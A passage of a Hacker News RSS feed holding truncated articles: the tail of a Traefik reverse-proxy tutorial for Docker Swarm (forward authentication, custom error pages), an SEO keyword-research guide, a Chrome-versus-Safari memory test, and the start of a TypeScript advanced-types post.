        <span>deploy</span><span>:</span>
            <span>placement</span><span>:</span>
                <span>constraints</span><span>:</span>
                    <span>-</span> <span>node.role == manager</span>
    <span>corporate</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your corporate image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.routers.corporate.rule=Host(`nlpcloud.io`)</span>
    <span>en_core_web_sm</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your en_core_web_sm model API image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.services.en_core_web_sm.loadbalancer.server.port=80</span>
                <span>-</span> <span>traefik.http.routers.en_core_web_sm.rule=Host(`api.nlpcloud.io`) &amp;&amp; PathPrefix(`/en_core_web_sm`)</span>
    <span>en_core_web_lg</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your en_core_web_lg model API image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.services.en_core_web_lg.loadbalancer.server.port=80</span>
                <span>-</span> <span>traefik.http.routers.en_core_web_lg.rule=Host(`api.nlpcloud.io`) &amp;&amp; PathPrefix(`/en_core_web_lg`)</span>
</code></pre></div></div>
<p>You can now access your corporate website at http://nlpcloud.io, your <code>en_core_web_sm</code> at http://api.nlpcloud.io/en_core_web_sm, and your <code>en_core_web_lg</code> at http://api.nlpcloud.io/en_core_web_lg.</p>
<p>It‚Äôs still fairly simple but the important things to notice are the following:</p>
<ul>
<li>We should explicitely use the <code>docker.swarmmode</code> provider instead of <code>docker</code></li>
<li>Labels should now be put in the <code>deploy</code> section</li>
<li>We need to manually declare the port of each service by using the <code>loadbalancer</code> directive (this has to be done manually because of Docker Swarm lacking the port auto discovery feature)</li>
<li>We have to make sure that Traefik will be deployed on a manager node of the Swarm by using <code>constraints</code></li>
</ul>
<p>You now have a fully fledge cluster thanks to Docker Swarm and Traefik. Now it‚Äôs likely that you have specific requirements and no doubt that the <a href="https://doc.traefik.io/traefik/contributing/documentation/">Trafik documentation</a> will help. But let me show you a couple of features we used at NLP Cloud.</p>
<h2 id="forwarded-authentication">Forwarded Authentication</h2>
<p>Let‚Äôs say your NLP API endpoints are protected and users need a token to reach them. A good solution for this use case is to leverage <a href="https://doc.traefik.io/traefik/middlewares/forwardauth/">Traefik‚Äôs ForwardAuth</a>.</p>
<p>Basically Traefik will forward all the user requests to a dedicated page you created for the occasion. This page will take care of checking the headers of the request (and maybe extract an authentication token for example) and determine whether the user has the right to access the resource. If it has, the page should return an HTTP 2XX code.</p>
<p>If a 2XX code is returned, Traefik will then make the actual request to the final API endpoint. Otherwise, it will return an error.</p>
<p>Please note that, for performance reasons, Traefik only forwards the user request headers to your authentication page, not the request body. So it‚Äôs not possible to authorize a user request based on the body of the request.</p>
<p>Here‚Äôs how to achieve it:</p>
<div><div><pre><code><span>version</span><span>:</span> <span>'</span><span>3.8'</span>
<span>services</span><span>:</span>
    <span>traefik</span><span>:</span>
        <span>image</span><span>:</span> <span>traefik:v2.4</span>
        <span>ports</span><span>:</span>
            <span>-</span> <span>"</span><span>80:80"</span>
        <span>command</span><span>:</span>
            <span>-</span> <span>--providers.docker.swarmmode</span>
        <span>volumes</span><span>:</span>
            <span>-</span> <span>/var/run/docker.sock:/var/run/docker.sock:ro</span>
        <span>deploy</span><span>:</span>
            <span>placement</span><span>:</span>
                <span>constraints</span><span>:</span>
                    <span>-</span> <span>node.role == manager</span>
    <span>corporate</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your corporate image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.routers.corporate.rule=Host(`nlpcloud.io`)</span>
    <span>en_core_web_sm</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your en_core_web_sm model API image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.services.en_core_web_sm.loadbalancer.server.port=80</span>
                <span>-</span> <span>traefik.http.routers.en_core_web_sm.rule=Host(`api.nlpcloud.io`) &amp;&amp; PathPrefix(`/en_core_web_sm`)</span>
                <span>-</span> <span>traefik.http.middlewares.forward_auth_api_en_core_web_sm.forwardauth.address=https://api.nlpcloud.io/auth/</span>
                <span>-</span> <span>traefik.http.routers.en_core_web_sm.middlewares=forward_auth_api_en_core_web_sm</span>
    <span>api_auth</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your api_auth image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.services.en_core_web_sm.loadbalancer.server.port=80</span>
                <span>-</span> <span>traefik.http.routers.en_core_web_sm.rule=Host(`api.nlpcloud.io`) &amp;&amp; PathPrefix(`/auth`)</span>
</code></pre></div></div>
<p>At NLP Cloud, the <code>api_auth</code> service is actually a Django + Django Rest Framework image in charge of authenticating the requests.</p>
<h2 id="custom-error-pages">Custom Error Pages</h2>
<p>Maybe you don‚Äôt want to show basic Traefik error pages to users. If so, it‚Äôs possible to replace error pages with your custom error pages.</p>
<p>Traefik does not keep any custom error page in memory, but it can use error pages served by one of your services.
When contacting your service in order to retrieve the custom error page, Traefik also passes the HTTP error code as a positional argument, so you can show different error pages based on the HTTP error.</p>
<p>Let‚Äôs says we have a small static website served by Nginx that serves your custom error pages. We want to use its error pages for HTTP errors from 400 to 599. Here‚Äôs how you would do it:</p>
<div><div><pre><code><span>version</span><span>:</span> <span>'</span><span>3.8'</span>
<span>services</span><span>:</span>
    <span>traefik</span><span>:</span>
        <span>image</span><span>:</span> <span>traefik:v2.4</span>
        <span>ports</span><span>:</span>
            <span>-</span> <span>"</span><span>80:80"</span>
        <span>command</span><span>:</span>
            <span>-</span> <span>--providers.docker.swarmmode</span>
        <span>volumes</span><span>:</span>
            <span>-</span> <span>/var/run/docker.sock:/var/run/docker.sock:ro</span>
        <span>deploy</span><span>:</span>
            <span>placement</span><span>:</span>
                <span>constraints</span><span>:</span>
                    <span>-</span> <span>node.role == manager</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.middlewares.handle-http-error.errors.status=400-599</span>
                <span>-</span> <span>traefik.http.middlewares.handle-http-error.errors.service=errors_service</span>
                <span>-</span> <span>traefik.http.middlewares.handle-http-error.errors.query=/{status}.html</span>
    <span>corporate</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your corporate image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.routers.corporate.rule=Host(`nlpcloud.io`)</span>
                <span>-</span> <span>traefik.http.routers.corporate.middlewares=handle-http-error</span>
    <span>errors_service</span><span>:</span>
        <span>image</span><span>:</span> <span>&lt;your static website image&gt;</span>
        <span>deploy</span><span>:</span>
            <span>labels</span><span>:</span>
                <span>-</span> <span>traefik.http.routers.corporate.rule=Host(`nlpcloud.io/errors`)</span>
</code></pre></div></div>
<p>For example thanks to the example above, a 404 error would now use this page: http://nlpcloud.io/errors/404.html</p>
<h2 id="https">HTTPS</h2>
<p>A cool feature from Traefik ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/">https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/</a></em></p>]]>
            </description>
            <link>https://juliensalinas.com/en/traefik-reverse-proxy-docker-compose-docker-swarm-nlpcloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26180044</guid>
            <pubDate>Thu, 18 Feb 2021 14:19:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proven Tips and Strategies to Increase Organic Traffic to Your Blog in 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179930">thread link</a>) | @Shehuaba
<br/>
February 18, 2021 | https://yourcontentmart.co/increase-organic-traffic-to-your-blog/ | <a href="https://web.archive.org/web/*/https://yourcontentmart.co/increase-organic-traffic-to-your-blog/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
		<div>
		

	<div id="primary">

		
					<main id="main">
				

<article id="post-1185" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<p>If you run a SaaS business, you probably know by now that search engine traffic (aka organic traffic) is a big deal.</p>



<p>Due to this, the competition to get a top spot in the search engines (especially Google) is becoming stiffer by the day.</p>



<p>Also, search engines work in a really unpredictable manner. Such that, what works previously, might not really work today.</p>



<p>In this post, I want to share with you how to increase organic traffic to your blog in 2021.</p>



<p>These tips and strategies work really well for SaaS businesses, and I‚Äôm going to break it all down for you.</p>



<p>Let‚Äôs get started.</p>




<h2><span id="Organic_Search_Engine_Traffic_Why_Is_It_a_Big_Deal"></span><strong>Organic (Search Engine) Traffic: Why Is It a Big Deal?</strong><span></span></h2>



<p>Recent <a href="https://www.brightedge.com/resources/research-reports/content-optimization" target="_blank" rel="noopener">research by BrightEdge</a> shows how important organic traffic is. </p>



<p>According to the report, search engines account for about 51% of all website traffic. Trumping other sources of traffic, such as social media and paid Ads.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/BrightEdge-Search-Traffic-Statistic.png" alt="organic traffic statistics by Brightedge" width="512" height="302" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/BrightEdge-Search-Traffic-Statistic.png 642w, https://yourcontentmart.co/wp-content/uploads/2021/02/BrightEdge-Search-Traffic-Statistic-300x178.png 300w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>This shows that, if you‚Äôre not focusing on optimizing your content to generate high-quality organic traffic as a SaaS business owner, you‚Äôre leaving so much on the table.</p>



<p>Another <a href="https://sparktoro.com/blog/the-powerhouses-of-the-internet-are-turning-hostile-to-websites/" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">research conducted by SparkToro</a> also buttresses this fact. </p>



<p>According to them, Google currently accounts for 57.8% of referral traffic on the web. </p>



<p>Aside from Facebook which records 5.2% website traffic, other search engines such as Yahoo and Bing account for 4.3% and 3.7% of website traffic, respectively.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/sparktoro-search-engine-traffic-statistic.png" alt="sparktoro organic traffic statistic" width="573" height="340" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/sparktoro-search-engine-traffic-statistic.png 829w, https://yourcontentmart.co/wp-content/uploads/2021/02/sparktoro-search-engine-traffic-statistic-300x178.png 300w, https://yourcontentmart.co/wp-content/uploads/2021/02/sparktoro-search-engine-traffic-statistic-768x457.png 768w" sizes="(max-width: 573px) 100vw, 573px"></figure></div>



<p>From the above, you can see that in 2021 and beyond, generating organic traffic for your business is uber-important. And this is why a lot of businesses continue to invest heavily on it.</p>



<p>In fact, according to <a aria-label="Borrel Associates, (opens in a new tab)" href="https://www.borrellassociates.com/industry-papers/papers/trends-in-digital-marketing-services-april-16-detail" target="_blank" rel="noreferrer noopener">Borrel Associates,</a> businesses and brands in the United States spent about $79.27 billion on SEO services in 2020.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/Borrel-Associates-SEO-spend-statistics.png" alt="Borrel Associates SEO spend statistics 2020" width="585" height="302" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/Borrel-Associates-SEO-spend-statistics.png 932w, https://yourcontentmart.co/wp-content/uploads/2021/02/Borrel-Associates-SEO-spend-statistics-300x155.png 300w, https://yourcontentmart.co/wp-content/uploads/2021/02/Borrel-Associates-SEO-spend-statistics-768x398.png 768w" sizes="(max-width: 585px) 100vw, 585px"></figure></div>



<p>As you can see, the amount that businesses spend on SEO services continues to increase year over year. If it weren‚Äôt that important or getting them results, they would most likely not do so.</p>



<p>Here are some other reasons why organic traffic still matters for you as a SaaS business owner in 2021.</p>



<h3><span id="1_You_Spend_Less_to_Generate_More_User_Signups"></span><strong>1. You Spend Less to Generate More User Signups</strong><span></span></h3>



<p>If you‚Äôre looking to get more leads and user signups for your SaaS business and spend less money to do so, then you should leverage organic traffic. </p>



<p>This is because, if you optimize your content for search engines, chances are that you‚Äôll get more results from it in the long run.</p>



<p>According to <a href="https://www.demandmetric.com/content/content-marketing-infographic" target="_blank" rel="noopener">Demand Metric</a>, by using content marketing alone, business owners get results that outperform traditional marketing in terms of ROI.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/demand-metric-content-statistics.png" alt="demand metric organic traffic statistic" width="539" height="240"></figure></div>



<p>Also, the amount they spend while doing so is 62% less compared to if they use other traditional forms of marketing.</p>



<h3><span id="2_You_Gain_The_Trust_of_Your_Audience_Easily"></span><strong>2. You Gain The Trust of Your Audience Easily</strong><span></span></h3>



<p>Gaining the trust of your audience sure matters to you as an online business owner. If you want to gain this trust easily, then you should optimize your content for search engines.</p>



<p>When you do, you‚Äôre most likely to show up in the SERPs when your target audience search for keywords related to what you do.</p>



<p>Since most people trust results from search engines, chances are that you‚Äôll gain their trust that way.</p>



<pre><strong>Fun fact,: About <a href="https://www.techclient.com/blogging-statistics/" target="_blank" rel="noopener">61% of consumers in the US</a> have made a purchase after stumbling on a blog post.</strong></pre>



<h3><span id="3_You_Get_Website_Traffic_On_Autopilot"></span><strong>3.</strong> <strong>You Get Website Traffic On Autopilot</strong><span></span></h3>



<p>This is one of the most important reasons why organic traffic continues to be useful. </p>



<p>If you create content and optimize it for search engines, you‚Äôll continue getting website visitors and traffic on autopilot.</p>



<p>Unlike paid Ads where you need to spend money each time you want to get more traffic to your website. With search engine traffic, you only need to set it up once and you‚Äôll continue getting targeted traffic without lifting a finger.</p>



<p>Sounds cool isn‚Äôt it?</p>



<p>So, how exactly do you increase organic traffic to your blog in 2021.</p>



<p>Let‚Äôs get to it.</p>



<h2><span id="How_To_Increase_Organic_Traffic_To_Your_Blog_Using_These_Proven_Tips_Strategies"></span><strong>How To Increase Organic Traffic To Your Blog Using These Proven Tips &amp; Strategies</strong><span></span></h2>



<p>You can see from the above that organic traffic is important and anyone running an online focus a lot on it. </p>



<p>What if I tell you that, most people who create content and optimize it for search engines do not get any results from it.</p>



<p>You‚Äôre surprised, right?</p>



<p>Well, don‚Äôt be.</p>



<p><a aria-label=" (opens in a new tab)" href="https://ahrefs.com/blog/search-traffic-study/" target="_blank" rel="noreferrer noopener">Research by Ahrefs</a> proves that this is the case. According to them, 90.63% of the content published online, do not get any traffic from Google.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/Ahrefs-organic-traffic-statistic.png" alt="Ahrefs organic traffic statistic" width="519" height="405" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/Ahrefs-organic-traffic-statistic.png 679w, https://yourcontentmart.co/wp-content/uploads/2021/02/Ahrefs-organic-traffic-statistic-300x234.png 300w" sizes="(max-width: 519px) 100vw, 519px"></figure></div>



<p>This shows that optimizing your content for search engines isn‚Äôt just enough in 2021. </p>



<p>You need to go the extra mile if you want to get any tangible results.</p>



<p>Still wondering how to increase organic traffic to your blog in 2021? Here are 4 proven tips and strategies you should implement right now.</p>



<h3><span id="1_Start_With_a_Solid_Foundation"></span><strong>1. Start With a Solid Foundation</strong><span></span></h3>



<p>If you want to get any form of results from organic traffic, then you should start with a solid foundation. </p>



<p>If you don‚Äôt, you‚Äôll most likely fail with it.</p>



<p>The foundation that any SaaS business which optimizes for search engine traffic should start with, is <strong>keyword research</strong>.</p>



<p>The reason is simple.</p>



<p>If you create content that nobody is searching for, your chance of getting any search traffic from it is slim.</p>



<p>So, when you perform keyword research, you‚Äôll understand exactly what your target audience is searching for.&nbsp;</p>



<p>That way, you can create content that ranks well and get traffic for you from these search engines.</p>



<h4><strong>But, How Do You Get Started With Keyword Research For a SaaS Business</strong>?</h4>



<p>Simple, by doing a Google search. </p>



<p>Say, your SaaS business is in the productivity niche, you can type the keyword ‚Äúproductivity tips‚Äù into Google.</p>



<p>When you do, it‚Äôll auto-suggest other keywords that people are actively searching for which are related to this root keyword.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-Google-autosuggest.png" alt="keyword research on Google" width="536" height="418" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-Google-autosuggest.png 707w, https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-Google-autosuggest-300x234.png 300w" sizes="(max-width: 536px) 100vw, 536px"></figure></div>



<p>From this, you can see that some of the keywords that your audience is also searching for include ‚Äúproductivity tips for working from home‚Äù, ‚Äúproductivity tips for work‚Äù, ‚Äúproductivity tips for entrepreneurs‚Äù, ‚Äúproductivity tips for small business owners‚Äù and so on.</p>



<p>With this information, you have an idea of some potential keywords that you can target for your content. </p>



<p>However, you don‚Äôt know exactly the number of people searching for each of them.</p>



<p>While you can go ahead and write about any of these topics, you can take it a step further by knowing the approximate number of people searching for these keywords. </p>



<p>To do this, there are free tools and paid tools which you can use.</p>



<p>Some of the free options are <a href="https://ads.google.com/home/tools/keyword-planner/" target="_blank" rel="noopener">Google Keyword Planner</a> and <a href="https://neilpatel.com/ubersuggest/" target="_blank" rel="noopener">UberSuggest</a>. </p>



<p>The paid tools alternative include <a href="https://moz.com/" target="_blank" rel="noopener">Moz</a>, <a href="https://ahrefs.com/" target="_blank" rel="noopener">Ahrefs</a>, <a href="https://www.semrush.com/" target="_blank" rel="noopener">SEMrush</a>, and so on.</p>



<p>For the sake of this post, I‚Äôll use SEMrush.</p>



<p>Let‚Äôs say, you want to target ‚Äúproductivity tips‚Äù as the keyword to write on.&nbsp; </p>



<p>All you need to do is hop on to SEMrush‚Äôs Keyword Magic Tool and enter your target keyword and hit search:</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/SEMrush-Keyword-Magic-Tool.png" alt="SEMrush Keyword Magic Tool" width="591" height="216" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/SEMrush-Keyword-Magic-Tool.png 843w, https://yourcontentmart.co/wp-content/uploads/2021/02/SEMrush-Keyword-Magic-Tool-300x110.png 300w, https://yourcontentmart.co/wp-content/uploads/2021/02/SEMrush-Keyword-Magic-Tool-768x282.png 768w" sizes="(max-width: 591px) 100vw, 591px"></figure></div>



<p>Once you do, it‚Äôll give you a comprehensive insight and report about that target keyword</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-SEMrush-keyword-research.png" alt="productivity tips SEMrush keyword research" width="556" height="376" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-SEMrush-keyword-research.png 906w, https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-SEMrush-keyword-research-300x203.png 300w, https://yourcontentmart.co/wp-content/uploads/2021/02/productivity-tips-SEMrush-keyword-research-768x520.png 768w" sizes="(max-width: 556px) 100vw, 556px"></figure></div>



<p>As you can see, the root keyword ‚Äúproductivity tips‚Äù has a search volume of 1000.</p>



<p>What this means is that, there are approximately 1000 persons searching for this keyword on Google.</p>



<p>Other related keywords such as ‚Äúadhd productivity tips‚Äù ‚Äútranscription productivity tips‚Äù and ‚Äúproductivity tips for working from home‚Äù has a search volume of 70, 70, and 110 respectively.</p>



<blockquote><p><strong>One thing to take note of is that the keyword volume is just an estimation. The exact number of persons searching for that keyword might be less or more than that.</strong></p></blockquote>



<p>With SEMrush, you can filter for different criteria such as volume, keyword difficulty, CPC, and so on. </p>



<p>After performing keyword research, you now have an idea of what your target audience is interested in, then you can proceed to the next strategy.</p>



<blockquote><p><em><strong>Additional Resources to Learn More About Keyword Research</strong></em></p><p>1. <a href="https://ahrefs.com/blog/keyword-research/" target="_blank" aria-label="Keyword Research: The Beginner's Guide By Ahrefs (opens in a new tab)" rel="noreferrer noopener"><strong>Keyword Research: The Beginner‚Äôs Guide By Ahrefs</strong></a></p><p>2. <a href="https://backlinko.com/keyword-research" target="_blank" rel="noopener"><strong>Keyword Research For SEO: The Definitive Guide</strong></a></p><p>3. <a href="https://neilpatel.com/blog/keyword-research/" target="_blank" rel="noopener"><strong>The Guide to Keyword Research By Neil Patel</strong></a></p></blockquote>



<h3><span id="2_Address_Your_Readers_Pain_Points_and_Solve_Them_Genuinely"></span><strong>2. Address Your Readers‚Äô Pain Points and Solve Them Genuinely</strong><span></span></h3>



<p>After keyword research, the next thing you need to do is create content.</p>



<p>While there is a lot of emphasis on creating content, there‚Äôs still a lot of grounds to cover in that regard. </p>



<p>This is because a lot of content out there is fluffy, hence don‚Äôt generate organic traffic.</p>



<p>Here is how to create content that drives traffic from search engines.</p>



<h4><strong>Publish long-form Content</strong></h4>



<p>If you want to create content that genuinely helps your target audience, then you should focus on publishing long-form content.&nbsp;</p>



<p>The reason is simple. T</p>



<p>here‚Äôs a high chance of solving your target audience‚Äôs problems when you publish long-form content. As they‚Äôre more detailed and generally thorough.</p>



<p>Also, numerous industry researches have shown that long-form content outperforms short-form content.</p>



<p>In a recent research, Backlinko found out that the <a href="https://backlinko.com/search-engine-ranking" target="_blank" rel="noopener">average length of posts on Google‚Äôs first page is 1890 words</a>.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/backlinko-content-marketing-statistic.png" alt="backlinko content marketing statistic" width="545" height="378" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/backlinko-content-marketing-statistic.png 737w, https://yourcontentmart.co/wp-content/uploads/2021/02/backlinko-content-marketing-statistic-300x208.png 300w" sizes="(max-width: 545px) 100vw, 545px"></figure></div>



<p>Hence, if you want to stand any chance of getting traffic from search engines, you should publish long-form content.</p>



<h4><strong>Create Content that Matches Search Intent</strong></h4>



<p>If you Google ‚Äú<strong>educational content marketing</strong>‚Äú, you‚Äôll find out that <a aria-label="this article I wrote on Winsome Writer (opens in a new tab)" href="https://winsomewriter.com/educational-content-marketing-strategies/" target="_blank" rel="noreferrer noopener">this article I wrote on Winsome Writer</a> currently ranks number 1 on the first page of Google.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/winsomewriter-post-that-ranks-no-1-on-Google.png" alt="educational content marketing" width="618" height="317" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/winsomewriter-post-that-ranks-no-1-on-Google.png 832w, https://yourcontentmart.co/wp-content/uploads/2021/02/winsomewriter-post-that-ranks-no-1-on-Google-300x154.png 300w, https://yourcontentmart.co/wp-content/uploads/2021/02/winsomewriter-post-that-ranks-no-1-on-Google-768x395.png 768w" sizes="(max-width: 618px) 100vw, 618px"></figure></div>



<p>That‚Äôs not all‚Ä¶</p>



<p>I also rank above some of the biggest brands such as Content Marketing Institute, Izea, Convince and Convert, Forbes, and so on for this keyword.</p>



<div><figure><img loading="lazy" src="https://yourcontentmart.co/wp-content/uploads/2021/02/ranking-above-CMI-and-co.png" alt="ranking above my competitors" width="571" height="524" srcset="https://yourcontentmart.co/wp-content/uploads/2021/02/ranking-above-CMI-and-co.png 714w, https://yourcontentmart.co/wp-content/uploads/2021/02/ranking-above-CMI-and-co-300x276.png 300w" sizes="(max-width: 571px) 100vw, 571px"></figure></div>



<p>So, how did I do it?</p>



<p>By creating content that meet the search intent of my audience. When you do this, your content will definitely get traffic from search engines.</p>



<p>By search intent, I mean, ensuring that your content answers the questions of your audience correctly.</p>



<p>And guess what, with a simple Google search, you can easily and evaluate the search intent of a particular topic.</p>



<p>Here‚Äôs an example:</p>



<p>Say you want to write a post targeting the keyword: <strong><em>‚Äúresources for freelance writers‚Äù</em></strong></p>



<p>You can search for this keyword on ‚Ä¶</p></div></div></article></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yourcontentmart.co/increase-organic-traffic-to-your-blog/">https://yourcontentmart.co/increase-organic-traffic-to-your-blog/</a></em></p>]]>
            </description>
            <link>https://yourcontentmart.co/increase-organic-traffic-to-your-blog/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179930</guid>
            <pubDate>Thu, 18 Feb 2021 14:07:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Browsers eating RAM]]>
            </title>
            <description>
<![CDATA[
Score 138 | Comments 148 (<a href="https://news.ycombinator.com/item?id=26179817">thread link</a>) | @todsacerdoti
<br/>
February 18, 2021 | https://www.flotato.com/post/memory-chrome-safari-flotato | <a href="https://web.archive.org/web/*/https://www.flotato.com/post/memory-chrome-safari-flotato">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I reached a point where I could barely hear the podcast I was trying to listen to. That's how loud the fan was. Then I&nbsp;closed down all open Chrome windows, and a few minutes after, the fan went silent. So I decided to see if it was just me.</p><div href=""><h3>How I&nbsp;measured</h3><p>I&nbsp;ran the 2-tab test in a completely fresh macOS install on a virtual machine. Then I ran the 54-tabs test on my own Big Sur installation, but with all extensions disabled. To record a usage snapshot ~250 times per second, I&nbsp;used <a href="https://github.com/astrofrog/psrecord">psrecord.</a></p></div><div><h2>2&nbsp;tabs:&nbsp;Twitter, then Gmail</h2><p>To simulate a realistic environment, I&nbsp;did the same steps on Safari, then Chrome:&nbsp;Go to twitter.com, scroll around, then open a new tab with Gmail and open an email. A dot means I interacted with the system. You can hover a dot to see what I&nbsp;did. </p></div><div><h3>Putting Flotato to the test</h3><p>To be light-weight, Flotato doesn't just run a stripped down, Safari-backed web view, it also defaults to the mobile version if one is available. Here's Flotato compared to a regular session in Safari. Note the slightly lower CPU usage. It's kind of hard to put a finger on what exactly the mobile version isn't calculating that the desktop version is; the two versions are almost identical when you use them.</p></div><div><h2>54 tabs:&nbsp;the stress test</h2><p>I&nbsp;bet you have more than 2 tabs open right now, I&nbsp;sure have more. So here's a stress test where I&nbsp;open 54 tabs while measuring the impact on my Mac's RAM and CPU. A dot means I&nbsp;opened a new tab. Hover the dot to see which site I&nbsp;opened.</p></div><div><h2>Is it bad?</h2><p>When I saw the results I got suspicious. Chrome was using way more memory than I thought it would. Maybe it was the virtual machine blocking Chrome's direct access to my Macbook's* GPU?&nbsp;I&nbsp;decided to run the next test, the one with 54 tabs directly on my own Big Sur installation. The results were, well, slightly worse.</p><h3>The graphs don't tell the full story</h3><p>But it's probably not as bad as it looks. It's not a terrible thing that an app actually <em>uses</em> your computer. And you've got to hand it to Chrome:&nbsp;it is fast! </p><p>I'm sure Chrome is going out of its way to manage its memory usage across tabs, keeping the current tab fast and responsive. That's great if you're not running any other macOS apps than Chrome, effectively using Chrome as your operating system, and macOS&nbsp;as a kind of bootloader. </p><p>But when you're using Sketch, Final Cut, Photoshop next to Chrome, that seems to be a problem. MacOS&nbsp;likely tries to tell Chrome to take it easy, and Chrome likely <em>does</em> take it easy. These graphs don't tell that story. </p><p>So no, it's most likely not as bad as it looks, but that doesn't change the fact since switching to Safari, I almost forgot what my fan sounds like.</p><p>And then there's <em>this</em> chart. As we can see, the two browsers heat up the computer almost to the exact same level - Safari even getting slightly warmer. This probably points to psutil not being able to see all Safari's child processes, but only the main ones ‚Äî despite the fact that Activity Monitor is able to group them. That's a little confusing. </p><figure><p><img src="https://uploads-ssl.webflow.com/5e78c687e58e25134b3fb751/602feb36d1388bb94f881998_EumcL7jXYAEBG_4.png" alt="Image"></p></figure><p>‚Äç</p><p>‚Äç</p><p><em>*&nbsp;Macbook 16" from 2019 with2.4 GHz, 8-Core Intel Core i9 with 32&nbsp;GB&nbsp;2667 MHz DDR4 RAM and an AMD&nbsp;Radeon Pro 5500M 8GB GPU</em></p></div></div>]]>
            </description>
            <link>https://www.flotato.com/post/memory-chrome-safari-flotato</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179817</guid>
            <pubDate>Thu, 18 Feb 2021 13:56:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Advanced Types in TypeScript]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179620">thread link</a>) | @mooreds
<br/>
February 18, 2021 | https://www.geekabyte.io/2021/01/introduction-to-advance-types-in.html | <a href="https://web.archive.org/web/*/https://www.geekabyte.io/2021/01/introduction-to-advance-types-in.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-5372611965284124411" itemprop="description articleBody">
<p>This is the start of a series of posts where I take a look at aspects of TypeScript's type system that can be referred to as "Advanced".&nbsp; See this as an exploration of TypeScript‚Äôs type system past <span>Classes</span> and <span>Interfaces</span>.</p><p>A good mental model to have when exploring the advanced part of TypeScript type system is to see it as a more sophisticated mechanism for creating types.&nbsp;</p><p>The normal, non-advanced ways of creating types in TypeScript involve using features of the language like <span>type alias</span>,&nbsp; <span>class</span> and <span>interface</span>.&nbsp;</p>

<p>For example these:&nbsp;</p>

<pre><code>interface IPerson {
  name: string
  age: number
}

type TPerson = {
  name: string
  age: number
}

class CPerson {
  constructor(private name:string, private age: number) {}
  
  getName() {
    return this.name;
  }

  getAge() {
    return this.name;
  }
}
</code></pre>



